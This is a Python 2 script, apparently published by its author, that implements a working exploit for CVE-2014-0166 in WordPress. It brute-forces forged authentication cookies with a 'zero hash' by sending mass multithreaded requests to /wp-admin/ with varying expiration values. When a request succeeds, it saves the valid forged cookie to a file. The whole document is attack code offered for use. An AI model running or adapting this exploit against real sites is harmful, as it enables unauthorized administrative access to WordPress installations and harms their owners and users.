#!/usr/bin/env python

"""
This script is the EXP of CVE-2014-0166.
By varying the expiration value of the cookie, an attacker can find a 'zero hash' to forge a valid cookie. 
However, on average, we need 300 million requets to find a 'zero hash'. 
Therefore I wrote this multithread script.

Details: http://www.ettack.org/wordpress-cookie-forgery/
Author: Ettack
Email: ettack@gmail.com
"""

import requests
import hmac
import threading
from hashlib import md5
from sys import stdout
from time import sleep,ctime,gmtime,time
from os import _exit

initnum = 0 	#Set the initial value here while performing distributed computing.
threadNum = 500
errTolerance = 0 	#If ErrorRequests/AllRequests > errTolerance, then decrease threads number

lock = threading.Lock()

url = 'http://test.com'
user = 'ettack'


expiration = 1400000000+initnum
cnt = 0+initnum


cookie_k = 'wordpress_' + md5(url).hexdigest()

def testCookie(url,user,expr):
	global errcnt
	cookie_v = user + '|' + str(expr) + '|0'
	cookie = {cookie_k:cookie_v}
	try:
		r = requests.head(url + '/wp-admin/',cookies=cookie)
	except requests.exceptions.ConnectionError:
		errcnt += 1
		# print "Connection ERROR occured in %s"%(threading.current_thread())
		sleep(8)
		return "Err"
	statcode = r.status_code
	if statcode == 200: 
		return cookie
	if statcode != 302:
		errcnt += 1
		sleep(5)
		return "Err"
	return False


def action():
	lock.acquire()
	global expiration,cnt
	expiration += 1
	cnt += 1
	stdout.flush()
	stdout.write("\r%s"%(cnt))
	lock.release()
	try:
		#Copy expiration value to expr.As expiration would be increased by other threads.
		expr = expiration
		#Loop until no error
		while True:
			result = testCookie(url,user,expr)
			if result != "Err": break
	except KeyboardInterrupt:
		print "Interrupted at %s"%(expiration)
		_exit(0)
	except Exception,e:
		print e

	#Cookie found! Output to screen and file (wp_result). Output consumed time as well.
	if result != False:
		print "\n\nCongratulations!!! Found valid cookie:"
		print str(result)
		dtime = time()-stime
		timestr = gmtime(dtime)
		print "\nRunning time: %sd %sh %sm %ss"%(timestr.tm_mday-1,timestr.tm_hour,timestr.tm_min,timestr.tm_sec)	
		with open("wp_result","w") as fp:
			fp.write(str(result))
			fp.close()
		_exit(0)


stime = time()
print "Start at %s"%(ctime())
print "Guessing with %d threads...\n"%(threadNum)

#Main part of guessing program
while True:
	threads = []
	errcnt = 0
	
	for i in xrange(threadNum):
		t = threading.Thread(target = action)
		threads.append(t)
		t.start()

	for t in threads:
		t.join()
	
	#Adjust threads number
	errRate = float(errcnt)/threadNum 
	if errRate > errTolerance:
		newThreadNum = int(threadNum * (1-0.5*errRate))
	 	print "\nToo many retries (%d/%d). Automatically decrease to %d threads!"%(errcnt,threadNum+errcnt,newThreadNum)
	 	threadNum = newThreadNum
	#Log process to wp_log
	with open("wp_log","w") as fp:
		fp.write(str(cnt))
		fp.close()



